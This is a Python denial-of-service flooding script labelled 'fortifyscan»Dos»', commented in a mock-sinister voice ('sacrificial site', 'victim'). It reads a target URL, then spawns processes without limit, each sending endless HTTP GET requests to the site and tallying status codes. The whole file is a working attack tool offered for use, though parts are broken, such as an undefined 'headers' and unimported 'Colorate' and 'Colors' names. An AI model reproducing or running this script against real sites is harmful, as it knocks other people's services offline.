import threading 
import aiohttp
import asyncio
import subprocess
import multiprocessing
import sys
import time
from time import sleep
import os

# Sinister colors for a sinister purpose
purple = '\033[95m'
blue = '\033[94m'
green = '\033[92m'
yellow = '\033[93m'
red = '\033[91m'
default = '\033[0m'
underline = '\033[4m'
orange = '\033[33m'

# Dark variables to summon the storm
num = 0
reqs = []
loop = asyncio.new_event_loop()
r = 0

# Sinister prompt to lure the unsuspecting target
print('Enter the sacrificial site:')
url = input(blue+'fortifyscan»Dos»'+default)

# Sinister validation of the victim's offering
print()
time.sleep(1)
if url.startswith("http") or url.startswith("https"):
  pass
else:
  url = "http://"+url

# The ritual to invoke the curse begins
async def fetch(session, url):
    global r, reqs
    start = int(time.time())
    while True:
      async with session.get(url, headers=headers) as response:
        if response:
          set_end = int(time.time())
          set_final = start - set_end
          final = str(set_final).replace("-", "")
 
          if response.status == 200:
            r += 1
          reqs.append(response.status)
          sys.stdout.write(f"Requests : {str(len(reqs))} | Time : {final} | Response Status Code => {str(response.status)}\r")
        else:
          print(Colorate.Horizontal(Colors.red_to_green, "[-] Server is not responding"))

# The demonic URLs to target
urls = []
urls.append(url)

# The summoning ritual commences
async def main():
  tasks = []
  async with aiohttp.ClientSession() as session:
    for url in urls:
      tasks.append(fetch(session, url))
    ddos = await asyncio.gather(*tasks)

# The gate to the abyss opens
def run():
    loop.run_forever(asyncio.run(main()))

# The portal to chaos remains open
if __name__ == '__main__':
  active = []
  ths = []
  while True:
    try:
      while True:
        th = multiprocessing.Process(target=run)
        try:
          th.start()
          ths.append(th)
          sys.stdout.flush()
        except RuntimeError:
          pass
    except:
      pass
